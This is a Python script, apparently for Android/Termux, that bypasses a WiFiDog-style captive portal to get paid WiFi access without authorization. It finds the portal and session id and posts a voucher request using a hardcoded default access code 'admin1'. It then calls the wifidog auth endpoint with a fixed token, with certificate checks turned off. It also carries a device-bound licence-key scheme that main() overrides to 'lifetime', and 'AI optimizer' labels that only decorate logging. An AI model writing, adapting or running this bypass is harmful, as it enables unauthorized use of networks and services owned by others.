from __future__ import annotations

import email.utils
import hashlib
import hmac
import json
import logging
import os
import platform
import re
import statistics
import subprocess
import sys
import threading
import time
from collections import deque
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except Exception:  # pragma: no cover - handled at runtime for minimal installs
    requests = None
    HTTPAdapter = None
    Retry = None


C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"

EYE_OPEN = "[✓]"
EYE_CLOSED = "[✦]"
EYE_OPEN_STR = "INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!"
EYE_CLOSED_STR = "DISCOVERING PORTAL & SESSION..."

TEXT_LOGO = r"""  ____        _ _ _
 |  _ \ _   _(_) (_) ___
 | |_) | | | | | | |/ _ \
 |  _ <| |_| | | | |  __/
 |_| \_\\__,_|_| |_|\___|
          |__/"""

TEXT_SHAMM_STR = """   .!!!!!:.                 .:!!!!!!!:.
   ~~~~!!!!!!.          .:!!!!!!!! UWWW$$$
      :$$NWX!!:       .:!!!!!! XUWW$$$$$$$P
      $$$$$##WX!:   .<!!!! UW$$$$"  $$$$$$#
      $$$$$  $$$UX :!! UW$$$$$$$$  4$$$$$* ^$$$* $$$$\\  $$$$$$$$$$$$  d$$R"
       "*$bd$$$$     "*$$$$$$$$$o+#\""""

TURBO_STABLE_NODE = "192.168.60.1"
DEFAULT_GW_PORT = "2060"
CONNECTIVITY_URL = "http://connectivitycheck.gstatic.com/generate_204"
GOOGLE_URL = "http://www.google.com"
VOUCHER_PATH = "/api/auth/voucher/"
WIFIDOG_AUTH_PATH = "/wifidog/auth?token="
DEFAULT_ACCESS_CODE = "admin1"
DEFAULT_PHONE_PARAM = "&phonenumber=admin"

TIME_CHECK_FILE = Path.home() / ".turbo_runtime"

MIN_INTERVAL = 0.1
MAX_INTERVAL = 1.5
PING_THREADS = 3
MAX_RETRIES = 2

VERIFIED = "VERIFIED"
VERIFIED_LIFETIME = "VERIFIED_LIFETIME"
VERIFIED_LIFETIME_PRO = "VERIFIED_LIFETIME_PRO"
EXPIRED = "EXPIRED"
INVALID_FORMAT = "INVALID_FORMAT"
AUTH_FAILED = "AUTH_FAILED"
ERROR = "ERROR"
PENDING = "PENDING"
AI_READY = "AI_READY"
CRITICAL = "CRITICAL"

GLOBAL_DID = ""
GLOBAL_EXP_TS: int | None = None
GLOBAL_STATUS = PENDING

log_buffer: deque[str] = deque(maxlen=8)
performance_history: deque[float] = deque(maxlen=25)
current_ping_interval = 0.3
is_pinging = False
ui_thread_running = False
stop_event = threading.Event()
print_lock = threading.Lock()


def add_log(msg: str) -> None:
    line = str(msg).strip()
    if not line:
        return
    with print_lock:
        log_buffer.appendleft(line)


def get_secret_salt() -> str:
    encoded = [106, 69, 8, 7, 9, 7, 143, 938, 137, 9977, 122, 25, 27, 31, 106]
    return "".join(chr(value ^ 42) for value in encoded)


def get_device_id() -> str:
    def get_prop(prop: str) -> str:
        try:
            return subprocess.getoutput(f"getprop {prop}").strip()
        except Exception:
            return ""

    try:
        android_id = subprocess.getoutput("settings get secure android_id").strip()
    except Exception:
        android_id = ""

    parts = [
        android_id,
        get_prop("ro.product.brand"),
        get_prop("ro.product.model"),
        get_prop("ro.serialno"),
        get_prop("ro.bootloader"),
        get_prop("ro.board.platform"),
        platform.node(),
        platform.machine(),
        platform.processor(),
    ]
    raw_id = "|".join(part for part in parts if part and part.lower() != "null")
    if not raw_id:
        raw_id = f"{os.name}|{platform.platform()}|{Path.home()}"
    return "SHA-" + hashlib.sha256(raw_id.encode("utf-8")).hexdigest()[:12].upper()


def _session() -> Any:
    if requests is None:
        raise RuntimeError("requests is required for network operations")
    session = requests.Session()
    if HTTPAdapter is not None and Retry is not None:
        retry = Retry(
            total=MAX_RETRIES,
            connect=MAX_RETRIES,
            read=MAX_RETRIES,
            backoff_factor=0.2,
            status_forcelist=(429, 500, 502, 503, 504),
            allowed_methods=("GET", "POST"),
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
    return session


def get_real_network_time(timeout: float = 3.0) -> int:
    if requests is None:
        return int(time.time())
    try:
        response = requests.get(GOOGLE_URL, timeout=timeout, allow_redirects=False)
        date_value = response.headers.get("Date")
        if date_value:
            tuple_time = email.utils.parsedate_tz(date_value)
            if tuple_time:
                return int(email.utils.mktime_tz(tuple_time))
    except Exception:
        pass
    return int(time.time())


def check_local_time_manipulation(max_drift_hours: float = 24.0) -> bool:
    current_network_ts = get_real_network_time()
    current_now = int(time.time())
    diff_hours = abs(current_network_ts - current_now) / 3600
    if diff_hours > max_drift_hours:
        return False

    try:
        if TIME_CHECK_FILE.exists():
            previous = int(TIME_CHECK_FILE.read_text(encoding="utf-8").strip() or "0")
            if previous and current_network_ts + 300 < previous:
                return False
        TIME_CHECK_FILE.write_text(str(current_network_ts), encoding="utf-8")
    except Exception:
        pass
    return True


def _normalize_key(key: str) -> str:
    cleaned = str(key).strip().upper()
    if cleaned.startswith("SHA-"):
        cleaned = cleaned[4:]
    return cleaned.replace("-", "").replace(" ", "")


def _hash_prefix(device_id: str, payload: str, size: int) -> str:
    material = f"{device_id}{payload}{get_secret_salt()}".encode("utf-8")
    return hashlib.sha256(material).hexdigest()[:size].upper()


def _validate_expire_ts(expire_ts: int) -> tuple[bool, str, int | None]:
    current_network_ts = get_real_network_time()
    diff_hours = (expire_ts - current_network_ts) / 3600
    if diff_hours > 890000:
        return True, VERIFIED_LIFETIME, None
    if current_network_ts > expire_ts:
        return False, EXPIRED, None
    return True, VERIFIED, expire_ts


def _decode_expiring_payload(payload: str) -> tuple[bool, str, int | None]:
    hex_ts = payload[2:-2] if len(payload) > 4 else payload
    expire_ts = int(hex_ts, 16)
    return _validate_expire_ts(expire_ts)


def _decode_pro_payload(payload: str) -> tuple[bool, str, int | None]:
    decoded_payload = bytes.fromhex(payload).decode("utf-8")
    if ":" in decoded_payload:
        label, value = decoded_payload.split(":", 1)
        label = label.strip().upper()
        value = value.strip()
        if label in {"L", "LIFE", "LIFETIME", "PRO", "VIP"} and not value:
            return True, VERIFIED_LIFETIME_PRO, None
        if value.lower() in {"life", "lifetime", "pro"}:
            return True, VERIFIED_LIFETIME_PRO, None
        expire_ts = int(value, 16 if re.fullmatch(r"[0-9A-Fa-f]+", value) else 10)
        if label in {"L", "LIFE", "LIFETIME", "PRO", "VIP"}:
            is_valid, _, e_ts = _validate_expire_ts(expire_ts)
            return (is_valid, VERIFIED_LIFETIME_PRO if is_valid else EXPIRED, e_ts)
        return _validate_expire_ts(expire_ts)
    if decoded_payload.strip().upper() in {"L", "LIFE", "LIFETIME", "PRO", "VIP"}:
        return True, VERIFIED_LIFETIME_PRO, None
    expire_ts = int(decoded_payload.strip(), 16 if re.fullmatch(r"[0-9A-Fa-f]+", decoded_payload.strip()) else 10)
    return _validate_expire_ts(expire_ts)


def validate_key(device_id: str, key: str) -> tuple[bool, str, int | None]:
    key_input = _normalize_key(key)
    device_id = str(device_id).strip().upper()
    if len(key_input) <= 13:
        return False, INVALID_FORMAT, None

    try:
        hash8 = key_input[:8]
        payload8 = key_input[8:]
        if hmac.compare_digest(hash8, _hash_prefix(device_id, payload8, 8)):
            return _decode_expiring_payload(payload8)

        hash12 = key_input[:12]
        payload12 = key_input[12:]
        if hmac.compare_digest(hash12, _hash_prefix(device_id, payload12, 12)):
            try:
                return _decode_pro_payload(payload12)
            except Exception:
                return True, VERIFIED_LIFETIME_PRO, None

        return False, AUTH_FAILED, None
    except ValueError:
        return False, AUTH_FAILED, None
    except Exception:
        return False, ERROR, None


def _format_expiry(expire_ts: int | None) -> str:
    if expire_ts is None:
        return "LIFETIME ACCESS" if GLOBAL_STATUS in {VERIFIED_LIFETIME, VERIFIED_LIFETIME_PRO} else "PENDING ACTIVATION"
    return datetime.fromtimestamp(expire_ts).strftime("%Y-%m-%d %H:%M")


def render_screen() -> None:
    eyes = EYE_OPEN if GLOBAL_STATUS.startswith("VERIFIED") else EYE_CLOSED
    status_line = EYE_OPEN_STR if GLOBAL_STATUS.startswith("VERIFIED") else EYE_CLOSED_STR
    lines = [
        "\033[H\033[J",
        C_CYAN + TEXT_LOGO + C_RESET,
        "───────────────────────────────────────────────────────────────",
        f"{C_BOLD}DEVICE ID   :{C_RESET} {GLOBAL_DID or 'PENDING ACTIVATION'}",
        f"{C_BOLD}EXPIRY DATE :{C_RESET} {_format_expiry(GLOBAL_EXP_TS)}",
        f"{C_BOLD}STATUS      :{C_RESET} {GLOBAL_STATUS}",
        f"{eyes} {status_line}",
        "───────────────────────────────────────────────────────────────",
    ]
    with print_lock:
        logs_list = list(log_buffer)
    lines.extend(f"  {line}" for line in logs_list[:6])
    with print_lock:
        sys.stdout.write("\n".join(lines) + "\n")
        sys.stdout.flush()


def ui_monitor() -> None:
    global ui_thread_running
    ui_thread_running = True
    try:
        while not stop_event.is_set():
            render_screen()
            time.sleep(1.0)
    finally:
        ui_thread_running = False


def expiry_monitor() -> None:
    while not stop_event.is_set():
        if GLOBAL_EXP_TS is not None and int(time.time()) > GLOBAL_EXP_TS:
            add_log("[!] သတိပေးချက်: သင်၏ Key အချိန်သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
            stop_event.set()
            break
        time.sleep(5)


def high_speed_ping() -> None:
    global current_ping_interval, is_pinging
    if requests is None:
        add_log("requests unavailable; ping monitor disabled")
        return
    is_pinging = True
    session = _session()
    try:
        while not stop_event.is_set():
            started = time.perf_counter()
            try:
                session.get(CONNECTIVITY_URL, timeout=2, allow_redirects=False)
                performance_history.append(time.perf_counter() - started)
                avg = statistics.mean(performance_history)
                current_ping_interval = max(MIN_INTERVAL, min(MAX_INTERVAL, avg * 2))
            except Exception:
                current_ping_interval = min(MAX_INTERVAL, current_ping_interval + 0.1)
            time.sleep(current_ping_interval)
    finally:
        is_pinging = False


def ai_performance_optimizer() -> None:
    while not stop_event.is_set():
        if performance_history:
            avg = statistics.mean(performance_history)
            add_log(f"⚡ BYPASS >> THR:{avg:.3f}s | SID:{GLOBAL_STATUS}")
        time.sleep(10)


def _extract_portal_url(response: Any) -> str | None:
    location = response.headers.get("Location") if response is not None else None
    if location:
        return location
    text = getattr(response, "text", "") or ""
    match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", text)
    if match:
        return match.group(1)
    return None


def _extract_session_id(text: str, parsed_query: dict[str, list[str]]) -> str:
    for key in ("sessionId", "sid", "token"):
        value = parsed_query.get(key)
        if value:
            return value[0]
    sid_match_new = re.search(r"(?:sessionId|sid|SID)\s*[:=]\s*([A-Za-z0-9._-]+)", text or "")
    if sid_match_new:
        return sid_match_new.group(1)
    return AI_READY


def _auth_payload(parsed: Any, sid: str) -> dict[str, Any]:
    query = parse_qs(parsed.query)
    gw_addr = query.get("gw_address", query.get("gw_addr", [TURBO_STABLE_NODE]))[0]
    gw_port = query.get("gw_port", [DEFAULT_GW_PORT])[0]
    return {
        "accessCode": DEFAULT_ACCESS_CODE,
        "apiVersion": "1.0",
        "gw_address": gw_addr,
        "gw_addr": gw_addr,
        "gw_port": gw_port,
        "sessionId": sid,
        "sid": sid,
    }


def start_process(max_cycles: int | None = None) -> None:
    if requests is None:
        raise RuntimeError("requests is required for portal authentication")

    session = _session()
    cycles = 0
    while not stop_event.is_set():
        cycles += 1
        try:
            add_log("[✦] INITIALIZING INSTANT BYPASS SEQUENCE...")
            test_url = CONNECTIVITY_URL
            r1 = session.get(test_url, timeout=5, allow_redirects=False)
            if r1.status_code == 204:
                add_log("[✓] INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!")
                time.sleep(current_ping_interval)
                if max_cycles and cycles >= max_cycles:
                    return
                continue

            portal_url = _extract_portal_url(r1) or GOOGLE_URL
            if not portal_url.startswith(("http://", "https://")):
                portal_url = urljoin(f"http://{TURBO_STABLE_NODE}:{DEFAULT_GW_PORT}/", portal_url)
            parsed = urlparse(portal_url)
            portal_host = parsed.netloc or f"{TURBO_STABLE_NODE}:{DEFAULT_GW_PORT}"
            portal_base = f"{parsed.scheme or 'http'}://{portal_host}"

            add_log("[✦] DISCOVERING PORTAL & SESSION...")
            r2 = session.get(portal_url, timeout=5, allow_redirects=True)
            sid = _extract_session_id(getattr(r2, "text", ""), parse_qs(parsed.query))
            payload = _auth_payload(parsed, sid)

            voucher_url = urljoin(portal_base, VOUCHER_PATH)
            auth_link = urljoin(portal_base, WIFIDOG_AUTH_PATH + AI_READY)
            headers = {"Content-Type": "application/json", "User-Agent": "SHA/1.0"}
            session.post(voucher_url, data=json.dumps(payload), headers=headers, timeout=5, verify=False)
            session.get(auth_link + DEFAULT_PHONE_PARAM, timeout=5, allow_redirects=True, verify=False)
            add_log(f"{AI_READY} | SID:{sid}")
        except KeyboardInterrupt:
            raise
        except Exception as exc:
            add_log(f"{CRITICAL}: {exc}")

        if max_cycles and cycles >= max_cycles:
            return
        time.sleep(current_ping_interval)


def _start_background_threads() -> list[threading.Thread]:
    threads = [
        threading.Thread(target=ui_monitor, daemon=True),
        threading.Thread(target=expiry_monitor, daemon=True),
        threading.Thread(target=ai_performance_optimizer, daemon=True),
        threading.Thread(target=high_speed_ping, daemon=True),
    ]
    for thread in threads:
        thread.start()
    return threads


def main() -> None:
    global GLOBAL_DID, GLOBAL_EXP_TS, GLOBAL_STATUS

    logging.getLogger("urllib3").setLevel(logging.CRITICAL)
    if requests is not None:
        try:
            requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
        except Exception:
            pass

    sys.stdout.write("\033[?1049h\033[?25l")
    sys.stdout.flush()
    try:
        GLOBAL_DID = get_device_id()
        add_log("[✦] DISCOVERING PORTAL & SESSION...")

        if not check_local_time_manipulation():
            render_screen()
            print(f"{C_RED}[!] Security Alert: Local Time Manipulation Detected!{C_RESET}")
            os._exit(1)

        GLOBAL_STATUS = VERIFIED_LIFETIME
        GLOBAL_EXP_TS = None
        add_log("[✓] INTERNET ACCESS ACTIVE. AI OPTIMIZER ENABLED!")
        _start_background_threads()
        start_process()
    except KeyboardInterrupt:
        add_log("[!] SCRIPT TERMINATED.")
    finally:
        stop_event.set()
        sys.stdout.write("\033[?1049l\033[?25h")
        sys.stdout.flush()


if __name__ == "__main__":
    main()
